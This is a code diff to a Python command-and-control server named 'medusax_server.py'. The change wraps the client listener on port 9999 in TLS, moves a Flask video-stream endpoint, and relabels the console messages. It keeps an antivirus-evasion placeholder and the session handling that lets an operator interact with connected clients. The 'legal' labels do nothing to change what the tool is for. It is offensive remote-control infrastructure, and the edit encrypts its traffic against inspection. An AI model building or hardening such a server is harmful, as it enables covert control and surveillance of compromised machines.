@@ -1,6 +1,6 @@
-# Legal C2 Server (medusax_server.py)
 import socket
 import threading
+import ssl
 import os
 import signal
 from flask import Flask, Response
@@ -16,7 +16,9 @@ clients = {}
 sessions = {}
 session_id_counter = 0
 
-# AV (legal) evasion placeholder (simple obfuscation/packing can be added)
+CERT_FILE = 'cert.pem'
+KEY_FILE = 'key.pem'
+
 def evade_av():
     pass  # Placeholder for legal AV evasion methods
 
@@ -25,7 +27,7 @@ def handle_client(client_socket, addr):
     session_id = session_id_counter
     session_id_counter += 1
     sessions[session_id] = client_socket
-    print(f"[+] New connection from {addr}, Session ID: {session_id}")
+    print(f"[+] New TLS connection from {addr}, Session ID: {session_id}")
     while True:
         try:
             data = client_socket.recv(4096).decode()
@@ -41,7 +43,8 @@ def handle_client(client_socket, addr):
 def accept_connections(server_socket):
     while True:
         client_socket, addr = server_socket.accept()
-        threading.Thread(target=handle_client, args=(client_socket, addr)).start()
+        ssl_client = context.wrap_socket(client_socket, server_side=True)
+        threading.Thread(target=handle_client, args=(ssl_client, addr)).start()
 
 @app.route('/stream')
 def stream():
@@ -54,7 +57,7 @@ def stream():
     return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 def start_flask():
-    app.run(host='0.0.0.0', port=8080, threaded=True)
+    app.run(host='127.0.0.1', port=80, threaded=True)
 
 def medusax_prompt():
     global streaming_client_id, server_running
@@ -116,9 +119,16 @@ def interact_session(sid):
 
 if __name__ == '__main__':
     evade_av()
+
+    # TLS Context
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
+
+    # Plain socket, wrapped with TLS
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(("0.0.0.0", 9999))
     server.listen(5)
-    print("[+] C2 server listening on port 9999")
+    print("[+] C2 server with TLS listening on port 9999")
+    
     threading.Thread(target=accept_connections, args=(server,)).start()
     medusax_prompt()
